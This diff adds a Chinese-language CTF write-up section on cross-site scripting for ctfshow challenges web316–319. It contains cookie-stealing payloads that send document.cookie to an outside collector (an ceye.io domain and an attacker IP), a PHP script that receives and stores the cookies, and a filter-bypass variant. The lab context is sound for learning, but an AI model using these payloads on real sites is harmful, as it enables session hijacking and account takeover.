@@ -2561,3 +2561,109 @@ $vip->getFlag();
 里面的换行我们用\r\n表示而不是\n\r。因为我们要以post方式提交一个参数token=ctfshow，所以**Content-Type: application/x-www-form-urlencoded并Content-Length: 13\r\n\r\ntoken=ctfshow** 。而这里的X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1是为了绕过那两次数组弹出元素。
 
 用nc开启本地监听
+
+
+
+## XSS
+
+> document.cookie							用于js获取当前网页的cookie值
+> window.location.href					 用于获取当前页面地址链接
+> window.location.href='www.baidu.com'	  用于相当于跳转地址
+>
+> 服务器准备的接收文件：xss.php
+> <?php
+> $cookie=$_GET['cookie'];
+> $myfile=fopen('cookie.txt','w+');
+> fwirte($myfile,$cookie);
+> fclose($myfile);
+> ?>
+>
+> http://[ip]/xss.php?cookie=document.cookie		用于给服务器发送当前界面的coolie
+> window.location.href='http://[ip]/xss.php?cookie='+document.cookie	用于指向服务器ip并把当前界面的cookie值作为get参数发送过去
+>
+> 最后的js语句payload：
+> <script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>
+
+### web316
+
+去**控制台**输入以下指令：alert(document.cookie)
+
+得到的信息为：
+
+```
+PHPSESSID=ptnd4qql435ille8hetr5bkij4; flag=you%20are%20not%20admin%20no%20flag
+```
+
+在ceye网站上注册临时域名，用它来反射出cookie。
+
+payload：
+
+```
+<script> var img=document.createElement("img"); img.src="http://hi8y3b.ceye.io/"+document.cookie; </script>
+```
+
+在后台里面得到flag
+
+![](.\XSS\图片\web316.png)
+
+经历了30多分钟，不容易啊。
+
+对payload的解释：
+
+```
+var img=document.createElement("img");  //这个是生成一个img对象
+img.src="http://hi8y3b.ceye.io/"+document.cookie; 
+/*是加载一张图片加上当前的cookie这里我们填写的是接收平台的地址，所以带上document.cookie去加载地址然后平台会有记录cookie的值，ctf平台会有个虚拟机器人，充当admin身份，每隔一段时间点开网站它一点开就会加载payload，发送它自身的cookie在那个框内输入那个标签输进去，网站一加载就执行了我们输入的xss代码然后他自己会发送cookie*/
+```
+
+
+
+### web317
+
+用上一次的payload试了一下，不行。
+
+因为带有过滤了
+
+思路：用body语句生成可绕过过滤的payload：
+
+```
+<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
+```
+
+此时会因为window.open()的作用弹出新的窗口，上面写着
+
+```
+{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
+```
+
+说明消息发送成功，那XSS应该也反弹生效了，回ceye查看后台可获得flag
+
+![](.\XSS\图片\web317.png)
+
+
+
+### web318
+
+过滤条件增加了
+
+```
+<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
+```
+
+这个payload依旧管用，先用着。
+
+![](.\XSS\图片\web318.png)
+
+
+
+### web319
+
+过滤条件又增加了
+
+```
+<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
+```
+
+但这个payload依旧坚挺。
+
+![](.\XSS\图片\web319.png)
